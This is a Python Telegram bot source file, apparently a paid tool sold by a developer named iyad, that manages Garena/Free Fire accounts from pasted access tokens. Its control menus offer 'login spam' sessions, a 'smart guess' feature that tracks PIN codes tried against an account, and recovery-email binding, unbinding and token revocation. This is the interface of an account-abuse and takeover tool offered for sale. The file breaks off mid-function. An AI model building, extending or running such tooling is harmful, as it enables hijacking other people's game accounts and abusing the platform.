import re
import logging
import asyncio
import json
from datetime import datetime, timedelta
from io import BytesIO
import ssl
import base64
import time
import random
import sys
import os
from pathlib import Path

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ChatMember
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
from telegram.error import BadRequest, Forbidden, TelegramError

from config import *
from database import DataManager, KeyManager, check_user_key, validate_key, PLATFORM_MAP, convert_seconds
import garena
import spam_manager

logger = logging.getLogger(__name__)

# ============================================================
# 🆕 إنشاء مجلد data تلقائياً لتخزين الملفات بشكل دائم
# ============================================================
os.makedirs("data", exist_ok=True)

# ============================================================
# FORCE SUBSCRIPTION SYSTEM - نظام الاشتراك الإجباري
# ============================================================
CHANNEL_CONFIG_FILE = "data/channel_config.json"    # ✅ تم التعديل
CUSTOM_TEXTS_FILE = "data/custom_texts.json"        # ✅ تم التعديل

def load_channel_config():
    """تحميل إعدادات القناة من الملف"""
    try:
        if Path(CHANNEL_CONFIG_FILE).exists():
            with open(CHANNEL_CONFIG_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
    except Exception as e:
        logger.error(f"Error loading channel config: {e}")
    return {}

def save_channel_config(config):
    """حفظ إعدادات القناة في الملف"""
    try:
        with open(CHANNEL_CONFIG_FILE, 'w', encoding='utf-8') as f:
            json.dump(config, f, ensure_ascii=False, indent=4)
        return True
    except Exception as e:
        logger.error(f"Error saving channel config: {e}")
        return False

# ============================================================
# CUSTOM TEXTS SYSTEM — رسائل وأزرار قابلة للتعديل من الأدمن
# ============================================================
DEFAULT_BUTTONS = {
    LANG_AR: {
        "add_acc": "➕ إضافة حساب جديد",
        "my_accs": "📂 قائمة حساباتي",
        "ctrl_accs": "⚙️ التحكم في الحسابات",
        "change_lang": "🌍 تغيير اللغة",
        "contact": "📞 تواصل مع المسؤول",
        "help": "❓ المساعدة",
        "admin_panel": "👑 لوحة تحكم الإدارة",
    },
    LANG_EN: {
        "add_acc": "➕ Add New Account",
        "my_accs": "📂 My Accounts",
        "ctrl_accs": "⚙️ Control Accounts",
        "change_lang": "🌍 Change Language",
        "contact": "📞 Contact Support",
        "help": "❓ Help & Guide",
        "admin_panel": "👑 Admin Panel",
    }
}

def load_custom_texts():
    try:
        if Path(CUSTOM_TEXTS_FILE).exists():
            with open(CUSTOM_TEXTS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
    except Exception as e:
        logger.error(f"Error loading custom texts: {e}")
    return {}

def save_custom_texts(data):
    try:
        with open(CUSTOM_TEXTS_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=4)
        return True
    except Exception as e:
        logger.error(f"Error saving custom texts: {e}")
        return False

def get_custom_text(key: str, lang: str = LANG_AR) -> str | None:
    """يرجع النص المخصص إن وُجد، وإلا None"""
    data = load_custom_texts()
    return data.get(lang, {}).get(key) or data.get("ar", {}).get(key)

def get_button_label(key: str, lang: str = LANG_AR) -> str:
    custom = get_custom_text(f"btn_{key}", lang)
    if custom:
        return custom
    return DEFAULT_BUTTONS.get(lang, DEFAULT_BUTTONS[LANG_AR]).get(key, key)

def get_channel_config():
    """الحصول على إعدادات القناة الحالية"""
    return load_channel_config()

async def check_user_subscription(bot, user_id: int, channel_username: str) -> bool:
    """التحقق من اشتراك المستخدم في القناة"""
    if not channel_username:
        return True  # إذا لم يتم تعيين قناة، السماح بالمرور
    
    try:
        # تنظيف اسم القناة
        channel_username = channel_username.replace("@", "").replace("https://t.me/", "").strip()
        
        # التحقق من عضوية المستخدم
        member = await bot.get_chat_member(chat_id=f"@{channel_username}", user_id=user_id)
        
        # حالات العضوية المقبولة
        allowed_statuses = ["creator", "administrator", "member"]
        
        return member.status in allowed_statuses
    except Exception as e:
        logger.error(f"Error checking subscription for user {user_id}: {e}")
        return False

def get_subscription_keyboard(lang: str, channel_username: str):
    """إنشاء لوحة أزرار الاشتراك الإجباري"""
    channel_url = f"https://t.me/{channel_username.replace('@', '').strip()}"
    
    if lang == LANG_AR:
        buttons = [
            [InlineKeyboardButton("📢 قناة إياد الرسمية", url=channel_url)],
            [InlineKeyboardButton("✅ تحقق من الاشتراك", callback_data="check_subscription")]
        ]
    else:
        buttons = [
            [InlineKeyboardButton("📢 iyad Official Channel", url=channel_url)],
            [InlineKeyboardButton("✅ Check Subscription", callback_data="check_subscription")]
        ]
    return InlineKeyboardMarkup(buttons)

# ============================================================
# LOCALIZATION (العربية والإنجليزية)
# ============================================================
LOCALIZED_TEXTS = {
    LANG_AR: {
        "welcome_unregistered": (
            "👑 <b>⚜️ 領iyad BoT 👑</b>\n"
            "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            "⚠️ <b>هذا البوت مدفوع وغير مجاني!</b>\n\n"
            "يرجى التواصل مع المطور مباشرة للحصول على مفتاح تفعيل لتتمكن من استخدام ميزات البوت الذكية والمزينة لإدارة حساباتك:\n"
            "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            f"👨‍💻 المطور: <b>{DEV_NAME}</b>\n"
            f"📱 حساب تليجرام: @{DEV_USER}\n"
        ),
        "welcome_back": (
            "👑 <b>⚜️ 領iyad BoT 👑</b>\n"
            "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            "✨ <b>أهلاً بك مجدداً في لوحة تحكم حسابات إياد الذكية!</b> ✨\n\n"
            "الآن يمكنك إدارة جميع حساباتك وفحصها وتعديلها بسهولة وبأزرار تفاعلية فخمة وخالية من الخربطة."
        ),
        "key_activated": "✅ <b>تم تفعيل المفتاح بنجاح!</b> استمتع بجميع الميزات والخصائص المزيّنة.",
        "invalid_key": "❌ <b>المفتاح غير صالح أو منتهي الصلاحية!</b> تواصل مع المطور شراء تفعيل.",
        "choose_lang": "🌍 <b>اختر اللغة المفضلة لديك / Choose Your Language:</b>",
        "lang_saved": "🌍 <b>تم حفظ وتأكيد تغيير لغة البوت إلى العربية بنجاح!</b>",
        "contact_us_text": (
            "📞 <b>تواصل معنا والدعم الفني:</b>\n"
            "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            f"👑 <b>المطور الرئيسي:</b> {DEV_NAME}\n"
            f"📱 <b>حساب الدعم والشراء المباشر:</b> @{DEV_USER}\n"
            "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            "راسلنا في أي وقت لتجديد تفعيلك أو طرح استفساراتك."
        ),
        "help_text": (
            "❓ <b>دليل الاستخدام السريع والمبسط:</b>\n"
            "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            "➕ <b>إضافة حساب:</b> لحفظ حساب جارينا جديد باستخدام كود/رابط الـ EAT.\n"
            "📂 <b>قائمة حساباتي:</b> تعرض حساباتك المضافة لتفقدها وفحص حالتها.\n"
            "⚙️ <b>التحكم في الحسابات:</b> لاختيار حساب محفوظ وإجراء عمليات الربط والفك وتأمين الحسابات بالكامل.\n"
            "🔑 <b>تشغيل Login:</b> لتشغيل جلسات تسجيل الدخول (SPAM LOGIN).\n"
            "⏹️ <b>إيقاف Login:</b> لإيقاف جميع جلسات تسجيل الدخول."
        ),
        "admin_welcome": (
            "👑 <b>لوحة تحكم الإدارة والمسؤول</b> 👑\n"
            "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            "مرحباً بك يا قائد! من هنا يمكنك توليد المفاتيح، والتحكم بالأعضاء والنسخ الاحتياطي بالكامل وبدون أي خربطة."
        ),
        "loading_verification": "⏳ <b>جاري التحقق من التوكن واستخراج معلومات الحساب...</b>",
        "enter_eat": "➕ <b>إضافة حساب Garena جديد لقائمتك</b>\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\nيرجى إرسال رابط تسجيل الدخول EAT الكامل أو التوكن المباشر الخاص بالحساب ليتم معالجته:\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬",
        "acc_added": "✅ <b>تم إضافة وحفظ الحساب بنجاح!</b>\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n👤 اسم الحساب: <b>{name}</b>\n🆔 معرف الحساب: <code>{aid}</code>\n🌍 المنطقة: <b>{region}</b>\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\nيمكنك الآن التحكم به بالكامل من قائمة التحكم.",
        "acc_not_found": "❌ لم يتم العثور على بيانات هذا الحساب.",
        "no_accs_ctrl": "📭 لا توجد حسابات للتحكم بها. أضف حساباً أولاً.",
        "choose_ctrl_acc": "⚙️ <b>اختر الحساب الذي تريد فتحه لإدارة عملياته:</b>",
        "enter_new_email": "🟢 <b>أدخل عنوان البريد الإلكتروني الجديد الذي تريد ربطه بالحساب:</b>",
        "cancel_success": "🗑️ <b>تم إلغاء طلب ربط البريد المعلق بنجاح.</b>",
        "deleted_success": "🗑️ <b>تم حذف وإزالة الحساب من قائمتك بالبوت تماماً بنجاح.</b>",
        "kick_success": "✅ تم طرد العضو صاحب الآيدي <code>{target_id}</code> بالكامل بنجاح.",
        "admin_added_success": "👑 تم ترقية العضو <code>{target_id}</code> إلى رتبة مسؤول بنجاح.",
        "broadcast_success": "✅ تم تسليم البث لـ <b>{sent}</b> عضو بنجاح.",
        "stats_title": "📊 <b>إحصائيات النظام الفنية الشاملة:</b>\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n🔑 إجمالي المفاتيح المولدة: <b>{keys_total}</b>\n🟢 المفاتيح النشطة حالياً: <b>{keys_active}</b>\n👥 الأعضاء المسجلين بالبوت: <b>{users_total}</b>\n📂 إجمالي الحسابات المحفوظة: <b>{accounts_total}</b>\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬",
        "long_bio_success": "✍️ <b>تم تعيين البايو الطويل بنجاح!</b>\n\n💬 النص الحالي:\n<code>{text}</code>",
        "enter_long_bio": "✍️ <b>أرسل الآن البايو (التوقيع) الطويل والملون الذي تريد تعيينه على حسابك فري فاير:</b>",
        "current_email": "📧 الإيميل المربوط:",
        "pending_email": "⏳ طلب ربط معلق:",
        "remaining_time": "⏱️ العداد المتبقي:",
        "no_saved_accs": "📭 ليس لديك حسابات محفوظة حالياً بالبوت.",
        "my_saved_accs_title": "📂 <b>قائمة حساباتك وحالتها النشطة الآن:</b>",
        "login_prompt": "🔑 **أرسل توكن الوصول (Access Token) لتشغيل جلسات تسجيل الدخول:**",
        "login_status_text": "📊 **حالة جلسات تسجيل الدخول:**\n\n{status}",
        "login_started": "✅ **تم تشغيل جلسات تسجيل الدخول بنجاح!**\n\n👤 **اسم الحساب:** {name}\n🆔 **UID:** {uid}\n🌍 **المنطقة:** {region}\n📱 **المنصة:** {platform}\n🔢 **عدد الجلسات:** {sessions}\n⏱️ **معدل البينق:** {ping} ثانية",
        "login_stopped": "✅ **تم إيقاف جميع جلسات تسجيل الدخول بنجاح!**",
        "login_already_active": "⚠️ جلسة تسجيل دخول نشطة بالفعل!",
        "login_not_active": "⚠️ لا توجد جلسات نشطة لإيقافها!",
        "login_failed": "❌ فشل تسجيل الدخول على جميع المنصات!",
        "subscription_required": (
            "⚠️ <b>يجب عليك الاشتراك في القناة أولاً!</b>\n\n"
            "📢 <b>اشترك في قناة إياد الرسمية للمتابعة</b>\n"
            "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            "👑 <b>بعد الاشتراك اضغط على زر التحقق</b>\n"
            "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
        ),
        "subscription_success": "✅ <b>تم التحقق من اشتراكك بنجاح!</b>\n\nيمكنك الآن متابعة استخدام البوت.",
        "subscription_failed": "❌ <b>لم يتم التحقق من اشتراكك!</b>\n\nيرجى الاشتراك في القناة أولاً ثم الضغط على زر التحقق مرة أخرى.",
        "set_channel_prompt": "📢 <b>إعداد قناة الاشتراك الإجباري</b>\n\nأرسل الآن معرف القناة (username) بدون @\nمثال: <code>iyad_channel</code>\n\nأو أرسل رابط القناة كاملاً:\nمثال: <code>https://t.me/iyad_channel</code>",
        "channel_set_success": "✅ <b>تم تعيين قناة الاشتراك الإجباري بنجاح!</b>\n\n📢 القناة الحالية: <b>@{channel}</b>",
        "channel_cleared": "✅ <b>تم إلغاء الاشتراك الإجباري بنجاح!</b>",
        "current_channel_info": "📢 <b>قناة الاشتراك الإجباري الحالية:</b> @{channel}",
        "no_channel_set": "❌ <b>لم يتم تعيين أي قناة للاشتراك الإجباري بعد!</b>"
    },
    LANG_EN: {
        "welcome_unregistered": (
            "👑 <b>⚜️ 領iyad BoT 👑</b>\n"
            "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            "⚠️ <b>This is a premium and paid bot!</b>\n\n"
            "Please contact the developer directly to purchase an activation key and unlock all smart account management utilities:\n"
            "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            f"👨‍💻 Developer: <b>{DEV_NAME}</b>\n"
            f"📱 Telegram: @{DEV_USER}\n"
        ),
        "welcome_back": (
            "👑 <b>⚜️ 領iyad BoT 👑</b>\n"
            "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            "✨ <b>Welcome back to your smart iyad Control Center!</b> ✨\n\n"
            "Now you can manage, bind, unbind, and inspect all Garena accounts cleanly with interactive inline menus."
        ),
        "key_activated": "✅ <b>Key Activated Successfully!</b> Enjoy our premium decorated tools.",
        "invalid_key": "❌ <b>The key you entered is invalid or expired!</b> Contact dev to buy a key.",
        "choose_lang": "🌍 <b>Choose Your Language / اختر اللغة المفضلة لديك:</b>",
        "lang_saved": "🌍 <b>Language successfully updated to English!</b>",
        "contact_us_text": (
            "📞 <b>Contact Us & Customer Support:</b>\n"
            "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            f"👑 <b>Lead Developer:</b> {DEV_NAME}\n"
            f"📱 <b>Support & Purchase Account:</b> @{DEV_USER}\n"
            "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            "Feel free to message us anytime for key renewals or assistance."
        ),
        "help_text": (
            "❓ <b>Quick User Manual:</b>\n"
            "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            "➕ <b>Add Account:</b> Save a Garena session using EAT link/token.\n"
            "📂 <b>My Accounts:</b> View saved account list and verify token status.\n"
            "⚙️ <b>Control Accounts:</b> Select an account to manage, bind email, unbind, and revoke tokens.\n"
            "🔑 <b>Start Login:</b> Start login sessions (SPAM LOGIN).\n"
            "⏹️ <b>Stop Login:</b> Stop all login sessions."
        ),
        "admin_welcome": (
            "👑 <b>Admin & Developer Dashboard</b> 👑\n"
            "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            "Welcome, Admin! Here you can safely generate keys, manage members, configure system-wide parameters, and fetch logs."
        ),
        "loading_verification": "⏳ <b>Verifying Garena session and extracting profile...</b>",
        "enter_eat": "➕ <b>Add Garena Account</b>\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\nPlease send the full EAT login URL or raw access token:\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬",
        "acc_added": "✅ <b>Account Added Successfully!</b>\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n👤 Nickname: <b>{name}</b>\n🆔 Account ID: <code>{aid}</code>\n🌍 Region: <b>{region}</b>\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\nYou can now fully manage it from the Control Panel.",
        "acc_not_found": "❌ Account data not found.",
        "no_accs_ctrl": "📭 You don't have any saved accounts yet. Add one first.",
        "choose_ctrl_acc": "⚙️ <b>Select the account you want to open and manage:</b>",
        "enter_new_email": "🟢 <b>Enter the new email address you want to bind to this account:</b>",
        "cancel_success": "🗑️ <b>Pending bind request cancelled successfully.</b>",
        "deleted_success": "🗑️ <b>Account deleted from bot registry successfully.</b>",
        "kick_success": "✅ User <code>{target_id}</code> kicked out and all keys detached.",
        "admin_added_success": "👑 User <code>{target_id}</code> promoted to admin successfully.",
        "broadcast_success": "✅ Broadcast delivered to <b>{sent}</b> users.",
        "stats_title": "📊 <b>System Statistics Data:</b>\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n🔑 Generated Keys: <b>{keys_total}</b>\n🟢 Active Keys: <b>{keys_active}</b>\n👥 Registered Users: <b>{users_total}</b>\n📂 Saved Accounts: <b>{accounts_total}</b>\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬",
        "long_bio_success": "✍️ <b>Long Bio set successfully!</b>\n\n💬 Current Bio:\n<code>{text}</code>",
        "enter_long_bio": "✍️ <b>Send the long, customized bio text you want to set on Garena profile:</b>",
        "current_email": "📧 Current Bound Email:",
        "pending_email": "⏳ Pending Bind Request:",
        "remaining_time": "⏱️ Remaining Time:",
        "no_saved_accs": "📭 You do not have any saved accounts in this bot currently.",
        "my_saved_accs_title": "📂 <b>Your saved accounts list and current active states:</b>",
        "login_prompt": "🔑 **Send Access Token to start login sessions:**",
        "login_status_text": "📊 **Login Sessions Status:**\n\n{status}",
        "login_started": "✅ **Login sessions started successfully!**\n\n👤 **Name:** {name}\n🆔 **UID:** {uid}\n🌍 **Region:** {region}\n📱 **Platform:** {platform}\n🔢 **Sessions:** {sessions}\n⏱️ **Ping:** {ping}s",
        "login_stopped": "✅ **All login sessions stopped successfully!**",
        "login_already_active": "⚠️ Login session already active!",
        "login_not_active": "⚠️ No active sessions to stop!",
        "login_failed": "❌ Login failed on all platforms!",
        "subscription_required": (
            "⚠️ <b>You must subscribe to the channel first!</b>\n\n"
            "📢 <b>Subscribe to iyad Official Channel</b>\n"
            "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            "👑 <b>After subscribing, click the verify button</b>\n"
            "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
        ),
        "subscription_success": "✅ <b>Subscription verified successfully!</b>\n\nYou can now continue using the bot.",
        "subscription_failed": "❌ <b>Subscription not verified!</b>\n\nPlease subscribe to the channel first, then click verify again.",
        "set_channel_prompt": "📢 <b>Set Force Subscription Channel</b>\n\nSend the channel username without @\nExample: <code>iyad_channel</code>\n\nOr send the full channel link:\nExample: <code>https://t.me/iyad_channel</code>",
        "channel_set_success": "✅ <b>Force subscription channel set successfully!</b>\n\n📢 Current channel: <b>@{channel}</b>",
        "channel_cleared": "✅ <b>Force subscription removed successfully!</b>",
        "current_channel_info": "📢 <b>Current force subscription channel:</b> @{channel}",
        "no_channel_set": "❌ <b>No force subscription channel set yet!</b>"
    }
}

def get_txt(key: str, lang: str = LANG_AR) -> str:
    # أولوية للنصوص المخصصة من الأدمن
    custom = get_custom_text(key, lang)
    if custom:
        return custom
    return LOCALIZED_TEXTS.get(lang, LOCALIZED_TEXTS[LANG_AR]).get(key, f"Missing [{key}]")

# ============================================================
# SMART DYNAMIC EDIT HELPER
# ============================================================
async def smart_edit(query, text: str, reply_markup: InlineKeyboardMarkup) -> None:
    try:
        if query.message.photo or query.message.caption is not None:
            await query.edit_message_caption(caption=text, reply_markup=reply_markup, parse_mode="HTML")
        else:
            await query.edit_message_text(text, reply_markup=reply_markup, parse_mode="HTML")
    except Exception:
        try:
            await query.edit_message_text(text, reply_markup=reply_markup, parse_mode="HTML")
        except:
            pass

# ============================================================
# INTERACTIVE KEYBOARD MARKUPS - ألوان منظمة ومتناسقة
# ============================================================
def make_user_menu(lang: str = LANG_AR, is_admin: bool = False) -> InlineKeyboardMarkup:
    buttons = [
        [InlineKeyboardButton(get_button_label("add_acc", lang), callback_data="btn_add_acc"),
         InlineKeyboardButton(get_button_label("my_accs", lang), callback_data="btn_my_accs")],
        [InlineKeyboardButton(get_button_label("ctrl_accs", lang), callback_data="btn_ctrl_accs"),
         InlineKeyboardButton(get_button_label("change_lang", lang), callback_data="btn_change_lang")],
        [InlineKeyboardButton(get_button_label("contact", lang), callback_data="btn_contact"),
         InlineKeyboardButton(get_button_label("help", lang), callback_data="btn_help")]
    ]
    if is_admin:
        buttons.append([InlineKeyboardButton(get_button_label("admin_panel", lang), callback_data="btn_admin_panel")])
    return InlineKeyboardMarkup(buttons)

def make_admin_menu(lang: str = LANG_AR, is_owner: bool = False) -> InlineKeyboardMarkup:
    if lang == LANG_AR:
        buttons = [
            [InlineKeyboardButton("🔑 توليد مفتاح فردي", callback_data="adm_gen_key"),
             InlineKeyboardButton("📦 توليد دفعة مفاتيح", callback_data="adm_gen_batch")],
            [InlineKeyboardButton("📋 عرض كل المفاتيح", callback_data="adm_list_keys"),
             InlineKeyboardButton("🔴 إيقاف وتعطيل مفتاح", callback_data="adm_disable_key")],
            [InlineKeyboardButton("📢 إعداد قناة الاشتراك", callback_data="adm_set_channel")],
            [InlineKeyboardButton("✏️ تعديل رسائل وأزرار البوت", callback_data="adm_edit_texts")],
            [InlineKeyboardButton("👤 طرد مستخدم عبر ID", callback_data="adm_kick_user"),
             InlineKeyboardButton("📊 إحصائيات النظام كاملة", callback_data="adm_stats")],
            [InlineKeyboardButton("📢 إرسال بث جماعي", callback_data="adm_broadcast")],
            [InlineKeyboardButton("↩️ الذهاب للوحة المستخدم", callback_data="adm_goto_user")]
        ]
        if is_owner:
            buttons.insert(3, [InlineKeyboardButton("➕ إضافة أدمن عبر ID", callback_data="adm_add_admin"),
                             InlineKeyboardButton("📋 الحصول على JSON LOG 🔒", callback_data="adm_json_log")])
    else:
        buttons = [
            [InlineKeyboardButton("🔑 Gen Individual Key", callback_data="adm_gen_key"),
             InlineKeyboardButton("📦 Gen Batch Keys", callback_data="adm_gen_batch")],
            [InlineKeyboardButton("📋 List All Keys", callback_data="adm_list_keys"),
             InlineKeyboardButton("🔴 Disable Activation Key", callback_data="adm_disable_key")],
            [InlineKeyboardButton("📢 Set Subscription Channel", callback_data="adm_set_channel")],
            [InlineKeyboardButton("✏️ Edit Bot Messages & Buttons", callback_data="adm_edit_texts")],
            [InlineKeyboardButton("👤 Kick User via ID", callback_data="adm_kick_user"),
             InlineKeyboardButton("📊 Full Stats Data", callback_data="adm_stats")],
            [InlineKeyboardButton("📢 Broadcast Msg", callback_data="adm_broadcast")],
            [InlineKeyboardButton("↩️ Go To User Dashboard", callback_data="adm_goto_user")]
        ]
        if is_owner:
            buttons.insert(3, [InlineKeyboardButton("➕ Add Admin via ID", callback_data="adm_add_admin"),
                             InlineKeyboardButton("📋 Download JSON LOG 🔒", callback_data="adm_json_log")])
    return InlineKeyboardMarkup(buttons)

def make_acc_control_keyboard(lang: str, aid: str, is_active: bool = False, is_guessing: bool = False, is_daily_limit: bool = False) -> InlineKeyboardMarkup:
    if lang == LANG_AR:
        if is_active:
            login_btn = InlineKeyboardButton("🔴 إيقاف سبام Login", callback_data=f"op_stop_login_{aid}")
        else:
            login_btn = InlineKeyboardButton("🚀 تشغيل سبام Login", callback_data=f"op_start_login_{aid}")
        
        if is_daily_limit:
            guess_btn = InlineKeyboardButton("⏳ حد يومي (انتظر 24س)", callback_data="op_daily_limit_alert")
        elif is_guessing:
            guess_btn = InlineKeyboardButton("🔴 إيقاف التخمين الذكي", callback_data=f"op_stop_guess_{aid}")
        else:
            guess_btn = InlineKeyboardButton("🚀 تشغيل التخمين الذكي", callback_data=f"op_start_guess_{aid}")
            
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("🟢 ربط إيميل استرداد", callback_data="op_add_email"),
             InlineKeyboardButton("🔍 فحص الإيميل الحالي", callback_data="op_check_email")],
            [InlineKeyboardButton("🌐 المنصات المرتبطة", callback_data="op_check_platforms"),
             InlineKeyboardButton("❌ إلغاء المعلق", callback_data="op_cancel_pending")],
            [InlineKeyboardButton("🔓 فك ربط الإيميل", callback_data="op_unbind_email"),
             InlineKeyboardButton("🔄 تغيير الإيميل", callback_data="op_change_email")],
            [InlineKeyboardButton("✍️ تعيين بايو طويل", callback_data="op_set_bio"),
             InlineKeyboardButton("🔴 إلغاء التوكن (Revoke)", callback_data="op_revoke_token")],
            [InlineKeyboardButton("🗑️ حذف الحساب من البوت", callback_data=f"op_delete_acc_{aid}")],
            [guess_btn],
            [login_btn],
            [InlineKeyboardButton("↩️ رجوع لقائمة الحسابات", callback_data="btn_ctrl_accs")]
        ])
    else:
        if is_active:
            login_btn = InlineKeyboardButton("🔴 Stop Login Spam", callback_data=f"op_stop_login_{aid}")
        else:
            login_btn = InlineKeyboardButton("🚀 Start Login Spam", callback_data=f"op_start_login_{aid}")
        
        if is_daily_limit:
            guess_btn = InlineKeyboardButton("⏳ Daily Limit", callback_data="op_daily_limit_alert")
        elif is_guessing:
            guess_btn = InlineKeyboardButton("🔴 Stop Smart Guess", callback_data=f"op_stop_guess_{aid}")
        else:
            guess_btn = InlineKeyboardButton("🚀 Start Smart Guess", callback_data=f"op_start_guess_{aid}")
            
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("🟢 Bind Recovery Email", callback_data="op_add_email"),
             InlineKeyboardButton("🔍 Inspect Current Email", callback_data="op_check_email")],
            [InlineKeyboardButton("🌐 Linked Platforms", callback_data="op_check_platforms"),
             InlineKeyboardButton("❌ Cancel Pending Request", callback_data="op_cancel_pending")],
            [InlineKeyboardButton("🔓 Unbind Recovery Email", callback_data="op_unbind_email"),
             InlineKeyboardButton("🔄 Change Email Address", callback_data="op_change_email")],
            [InlineKeyboardButton("✍️ Set Long Profile Bio", callback_data="op_set_bio"),
             InlineKeyboardButton("🔴 Revoke Token (Logout)", callback_data="op_revoke_token")],
            [InlineKeyboardButton("🗑️ Delete Account Registry", callback_data=f"op_delete_acc_{aid}")],
            [guess_btn],
            [login_btn],
            [InlineKeyboardButton("↩️ Back to Account List", callback_data="btn_ctrl_accs")]
        ])

# ============================================================
# BOT COMMANDS & STATUS COMMANDS
# ============================================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    user_id = user.id
    DataManager.ensure_user(user_id, user.username or "", user.first_name or "")
    lang = DataManager.get_user_lang(user_id)
    is_admin = DataManager.is_admin(user_id)
    
    # التحقق من الاشتراك الإجباري أولاً
    channel_config = get_channel_config()
    channel_username = channel_config.get("channel_username", "")
    
    if channel_username and not is_admin:
        is_subscribed = await check_user_subscription(context.bot, user_id, channel_username)
        if not is_subscribed:
            msg = get_txt("subscription_required", lang)
            await update.message.reply_html(
                msg,
                reply_markup=get_subscription_keyboard(lang, channel_username)
            )
            context.user_data["state"] = "awaiting_subscription"
            return
    
    if not check_user_key(user_id):
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("📞 شراء تفعيل / Buy Key", url=f"https://t.me/{DEV_USER}")]])
        msg = get_txt("welcome_unregistered", lang)
        context.user_data["state"] = "awaiting_activation_key"
        await update.message.reply_html(msg, reply_markup=keyboard)
        return
    
    await update.message.reply_html(
        get_txt("welcome_back", lang),
        reply_markup=make_user_menu(lang, is_admin)
    )

async def cmd_login_status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    lang = DataManager.get_user_lang(user_id)
    
    if not check_user_key(user_id):
        await update.message.reply_html(get_txt("invalid_key", lang))
        return
    
    status = spam_manager.get_login_status()
    await update.message.reply_html(get_txt("login_status_text", lang).format(status=status))

# ============================================================
# DYNAMIC VIEW HELPER
# ============================================================
async def show_account_control_view(query, user_id: int, aid: str, context: ContextTypes.DEFAULT_TYPE) -> None:
    lang = DataManager.get_user_lang(user_id)
    u_info = DataManager.get_users().get(str(user_id), {})
    acc_data = u_info.get("accounts", {}).get(aid)
    if not acc_data:
        await smart_edit(query, get_txt("acc_not_found", lang), InlineKeyboardMarkup([]))
        return
        
    email, pending, countdown, _ = await garena.get_bind_info(acc_data["ACCESS_TOKEN"])
    
    lbl_current = get_txt("current_email", lang)
    lbl_pending = get_txt("pending_email", lang)
    lbl_remaining = get_txt("remaining_time", lang)
    opt_lbl = "اختر أي عملية تفاعلية لتنفيذها على الحساب:" if lang == LANG_AR else "Select any interactive operation to perform on Garena account:"
    
    banner_url = f"https://nirob-free-fire-baner.vercel.app/profile?uid={acc_data['ID']}"
    invisible_preview_link = f'<a href="{banner_url}">&#8205;</a>'
    
    is_active_for_this = spam_manager.is_session_active(aid)
    is_guessing_for_this = acc_data.get("guessing_active", False)
    
    today_str = datetime.now().strftime("%Y-%m-%d")
    is_daily_limit = (acc_data.get("last_guess_date", "") == today_str) and (acc_data.get("guesses_today_count", 0) >= 10)
    
    if lang == LANG_AR:
        spam_status = "🟢 نشط ومستمر" if is_active_for_this else "🔴 متوقف حالياً"
        if is_daily_limit:
            guess_status = "⏳ حد يومي (10/10)"
        elif is_guessing_for_this:
            guess_status = f"🟢 نشط (تم فحص {acc_data.get('pin_index', 0)} رمز)"
        else:
            guess_status = "🔴 متوقف"
    else:
        spam_status = "🟢 Active & Running" if is_active_for_this else "🔴 Currently Inactive"
        if is_daily_limit:
            guess_status = "⏳ Daily Limit (10/10)"
        elif is_guessing_for_this:
            guess_status = f"🟢 Active ({acc_data.get('pin_index', 0)} tried)"
        else:
            guess_status = "🔴 Inactive"
        
    msg = (
        f"{invisible_preview_link}👑 <b>⚜️ {acc_data['NAME']} ⚜️</b> 👑\n"
        f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
        f"🆔 معرف الحساب: <code>{acc_data['ID']}</code>\n"
        f"🌍 المنطقة: <b>{acc_data['region']}</b>\n"
        f"⚡ حالة سبام الدخول: <b>{spam_status}</b>\n"
        f"🧠 حالة التخمين الذكي: <b>{guess_status}</b>\n"
        f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
